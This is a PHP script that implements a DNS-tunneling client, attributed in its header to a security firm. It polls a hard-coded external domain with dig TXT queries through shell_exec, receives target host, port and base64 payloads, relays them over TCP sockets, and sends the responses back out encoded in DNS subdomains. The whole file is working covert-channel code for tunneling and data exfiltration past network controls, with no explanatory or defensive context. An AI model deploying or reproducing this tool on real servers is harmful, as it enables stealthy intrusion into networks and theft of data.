<?php
/**
 * Created by FBK CyberSecurity.
 * User: Sergey Migalin
 * Date: 28/11/2018
 * Time: 18:06
 */

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function getDataFromDNSResponse($response = "") {
    return preg_replace("[\"]", '', preg_replace('/\s/', '', $response));
}

function sendResponse($response = "", $hostname, $client_id, $max_block_len=200) {
    for($i = 0; $i < strlen($response) / $max_block_len; $i += 1) {

        $count_block = str_pad(strval(floor(strlen($response) / $max_block_len) - $i), 3, "0", STR_PAD_LEFT);

        if (strlen($response) / $max_block_len == 1) {
            $count_block = "000";
        }

        $part = substr($response, $i * $max_block_len, min($max_block_len, strlen($response) - ($i * $max_block_len)));

        if (strlen($part) > 189) {
            $part = substr($part, 0, 63) . "." . substr($part, 63, 63) . "." . substr($part, 126, 63) . "." . substr($part, 189);
        } else if (strlen($part) > 126) {
            $part = substr($part, 0, 63) . "." . substr($part, 63, 63) . "." . substr($part, 126);
        } else if (strlen($part) > 63) {
            $part = substr($part, 0, 63) . "." . substr($part, 63);
        }

        echo "dig +noall +answer " . "2" . generateRandomString(4) . $client_id . $count_block . "." . $part . "." . $hostname . " TXT \n";
        $send_to_srv = shell_exec("dig +noall +answer " . "2" . generateRandomString(4) . $client_id . $count_block . "." . $part . "." . $hostname . " TXT");
        echo $send_to_srv;

    }
}

$hostname = "oversec.ru.";
$client_name = "php";

$client_id = shell_exec("dig +noall +answer " . "0" . generateRandomString(7) . $client_name . "." . $hostname . " TXT | cut -f5");

$client_id = substr(getDataFromDNSResponse($client_id), 0, 2);
echo "Client has id=" . $client_id;

$tcp_client = null;
$target_host = null;
$target_port = null;

while (1){
    if ($tcp_client !== null){
        echo "reading...";
        $resp = fgets($tcp_client, 1024);
        sendResponse(base64_encode($resp), $hostname, $client_id);

    }

    $data = getDataFromDNSResponse(
        shell_exec("dig +noall +answer " . "1" . generateRandomString(7) . $client_id . "." . $hostname . " TXT | cut -f5")
    );

    if ($data == $client_id . "ND"){
        echo "reading...\n";
        continue;
    }

    echo "DATA FROM SERVER: " . $data . "\n";

    $data = explode(':', $data);

    if ( ($target_port != $data[1]) and ($target_host != $data[0]) ){
        $target_host = substr($data[0], 2);
        $target_port = $data[1];
        echo "host=" . $target_host . " port=" . $target_port . "\n";
        $tcp_client = stream_socket_client("tcp://" . $target_host . ":" . $target_port, $errno, $errstr, 1);
        stream_set_blocking($tcp_client, false);
        echo "Client connected\n";
    }

    $payload = base64_decode($data[2]);
    fwrite($tcp_client, $payload);
}
